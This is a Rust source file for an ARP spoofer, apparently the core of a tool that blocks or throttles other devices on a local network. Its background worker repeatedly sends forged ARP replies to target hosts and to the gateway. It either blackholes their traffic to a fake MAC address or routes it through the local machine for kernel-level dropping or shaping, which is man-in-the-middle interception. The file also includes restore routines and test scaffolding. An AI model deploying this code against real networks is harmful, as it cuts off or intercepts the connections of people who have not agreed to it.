use parking_lot::RwLock;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

pub static SPOOFER_TARGET_ADD_COUNT: AtomicU64 = AtomicU64::new(0);

pub fn target_add_count() -> u64 {
    SPOOFER_TARGET_ADD_COUNT.load(Ordering::SeqCst)
}

pub fn reset_target_add_count() {
    SPOOFER_TARGET_ADD_COUNT.store(0, Ordering::SeqCst);
}

use crate::spoofer::raw_l2::{craft_arp_reply, RawL2Sender};
use crate::types::{Host, HostStatus, MacAddress};

/// Locally administered unicast blackhole MAC address.
/// Frames sent to this address are silently dropped by the switch/AP at L2,
/// preventing the blocked victim's packet flood from saturating the local host's adapter.
pub const BLACKHOLE_MAC: MacAddress = MacAddress([0x02, 0xbf, 0x00, 0x00, 0x00, 0x01]);

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SpooferMode {
    /// L2 blackholing: Victims send traffic to BLACKHOLE_MAC, silently dropped by L2 switch/AP
    Blackhole,
    /// MITM kernel drop: Victims send traffic to local host MAC, dropped by WinDivert kernel filter
    Mitm,
}

#[derive(Clone)]
pub struct ArpSpoofer {
    sender: Arc<RwLock<Option<RawL2Sender>>>,
    local_mac: MacAddress,
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddress,
    targets: Arc<RwLock<HashMap<Ipv4Addr, Host>>>,
    running: Arc<AtomicBool>,
    mode: Arc<RwLock<SpooferMode>>,
}

impl ArpSpoofer {
    pub fn new_inactive(
        local_mac: MacAddress,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddress,
    ) -> Self {
        Self {
            sender: Arc::new(RwLock::new(None)),
            local_mac,
            gateway_ip,
            gateway_mac,
            targets: Arc::new(RwLock::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
        }
    }

    /// Creates an ArpSpoofer equipped with a dummy sender for hermetic tests without Npcap.
    pub fn new_with_dummy_sender_for_testing(
        local_mac: MacAddress,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddress,
    ) -> Self {
        Self {
            sender: Arc::new(RwLock::new(Some(RawL2Sender::new_dummy_for_testing()))),
            local_mac,
            gateway_ip,
            gateway_mac,
            targets: Arc::new(RwLock::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
        }
    }

    pub fn new(
        iface_name: &str,
        local_mac: MacAddress,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddress,
    ) -> Self {
        let sender = match RawL2Sender::open(iface_name) {
            Ok(s) => Some(s),
            Err(e) => {
                eprintln!("[WARN] L2 raw injection initialization: {}", e);
                None
            }
        };

        Self {
            sender: Arc::new(RwLock::new(sender)),
            local_mac,
            gateway_ip,
            gateway_mac,
            targets: Arc::new(RwLock::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
        }
    }

    pub fn mode(&self) -> SpooferMode {
        *self.mode.read()
    }

    pub fn set_mode(&self, mode: SpooferMode) {
        *self.mode.write() = mode;
    }

    pub fn has_sender(&self) -> bool {
        self.sender.read().is_some()
    }

    pub fn target_count(&self) -> usize {
        self.targets.read().len()
    }

    pub fn add(&self, host: Host) -> Result<(), String> {
        if self.sender.read().is_none() {
            return Err(
                "Cannot add target: raw Layer 2 packet injection sender is not initialized (Npcap unavailable)"
                    .into(),
            );
        }
        if host.ip == self.gateway_ip {
            return Err("Gateway IP cannot be added as a spoofer target".into());
        }
        if host.ip.is_unspecified()
            || host.ip.is_loopback()
            || host.ip.is_broadcast()
            || host.ip.is_multicast()
        {
            return Err(format!("Invalid non-unicast target IP: {}", host.ip));
        }
        if host.mac == self.gateway_mac {
            return Err("Gateway MAC cannot be added as a spoofer target".into());
        }
        if host.mac.is_zero() || host.mac.is_broadcast() || (host.mac.0[0] & 1 != 0) {
            return Err(format!(
                "Invalid non-unicast target MAC address: {}",
                host.mac
            ));
        }
        self.targets.write().insert(host.ip, host);
        SPOOFER_TARGET_ADD_COUNT.fetch_add(1, Ordering::SeqCst);
        self.start_worker();
        Ok(())
    }

    pub fn update_status(&self, ip: &Ipv4Addr, status: crate::types::HostStatus) {
        if let Some(target) = self.targets.write().get_mut(ip) {
            target.status = status;
        }
    }

    pub fn remove(&self, ip: &Ipv4Addr) {
        if let Some(host) = self.targets.write().remove(ip) {
            self.restore(&host);
        }
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
        let targets = self
            .targets
            .write()
            .drain()
            .map(|(_, h)| h)
            .collect::<Vec<_>>();
        for host in targets {
            self.restore(&host);
        }
    }

    pub fn restore(&self, host: &Host) {
        if let Some(ref sender) = *self.sender.read() {
            for _ in 0..3 {
                // Restore host: tell host that gateway is at genuine gateway_mac.
                // Ethernet source MAC must be host's local_mac (the transmitting adapter).
                let pkt_host = craft_arp_reply(
                    host.mac,
                    self.local_mac,
                    self.gateway_ip,
                    self.gateway_mac,
                    host.ip,
                    host.mac,
                );
                let _ = sender.send_frame(&pkt_host);

                // Restore gateway: tell gateway that host is at genuine host.mac.
                // Ethernet source MAC must be host's local_mac (the transmitting adapter).
                let pkt_gw = craft_arp_reply(
                    self.gateway_mac,
                    self.local_mac,
                    host.ip,
                    host.mac,
                    self.gateway_ip,
                    self.gateway_mac,
                );
                let _ = sender.send_frame(&pkt_gw);
                thread::sleep(Duration::from_millis(50));
            }
        }
    }

    fn start_worker(&self) {
        if self.running.swap(true, Ordering::SeqCst) {
            return;
        }

        let targets = Arc::clone(&self.targets);
        let sender = Arc::clone(&self.sender);
        let running = Arc::clone(&self.running);
        let mode = Arc::clone(&self.mode);
        let local_mac = self.local_mac;
        let gateway_ip = self.gateway_ip;
        let gateway_mac = self.gateway_mac;

        thread::spawn(move || {
            while running.load(Ordering::Relaxed) {
                let hosts: Vec<Host> = targets.read().values().cloned().collect();
                if let Some(ref s) = *sender.read() {
                    for host in hosts {
                        if !running.load(Ordering::Relaxed) {
                            break;
                        }

                        // Determine target MAC for poisoning based on status and spoofer mode:
                        // - For Blocked: if SpooferMode::Blackhole, use BLACKHOLE_MAC so traffic is
                        //   dropped at L2 by the switch/AP. If SpooferMode::Mitm, route to local_mac
                        //   so WinDivert kernel filter drops packets.
                        // - For Limited: route to local_mac so WinDivert can shape packets.
                        let (spoof_gw_mac, spoof_host_mac) = match host.status {
                            HostStatus::Blocked(dir) => {
                                let block_target_mac = match *mode.read() {
                                    SpooferMode::Blackhole => BLACKHOLE_MAC,
                                    SpooferMode::Mitm => local_mac,
                                };
                                let gw_mac = if dir.includes_outgoing() {
                                    block_target_mac
                                } else {
                                    local_mac
                                };
                                let h_mac = if dir.includes_incoming() {
                                    block_target_mac
                                } else {
                                    local_mac
                                };
                                (gw_mac, h_mac)
                            }
                            _ => (local_mac, local_mac),
                        };

                        // Poison target host: Gateway IP is at spoof_gw_mac.
                        // Ethernet frame source MAC MUST be local_mac (transmitting station address on medium)
                        // so Wi-Fi APs and 802.11/NDIS firmware deliver the packet rather than dropping it.
                        let pkt_host = craft_arp_reply(
                            host.mac,
                            local_mac,
                            gateway_ip,
                            spoof_gw_mac,
                            host.ip,
                            host.mac,
                        );
                        let _ = s.send_frame(&pkt_host);

                        // Poison gateway: Host IP is at spoof_host_mac.
                        // Ethernet frame source MAC MUST be local_mac.
                        let pkt_gw = craft_arp_reply(
                            gateway_mac,
                            local_mac,
                            host.ip,
                            spoof_host_mac,
                            gateway_ip,
                            gateway_mac,
                        );
                        let _ = s.send_frame(&pkt_gw);
                    }
                }
                for _ in 0..10 {
                    if !running.load(Ordering::Relaxed) {
                        break;
                    }
                    thread::sleep(Duration::from_millis(100));
                }
            }
        });
    }
}

impl Drop for ArpSpoofer {
    fn drop(&mut self) {
        // Only run destructive teardown when the last clone drops
        if Arc::strong_count(&self.running) <= 1 {
            self.stop();
        }
    }
}
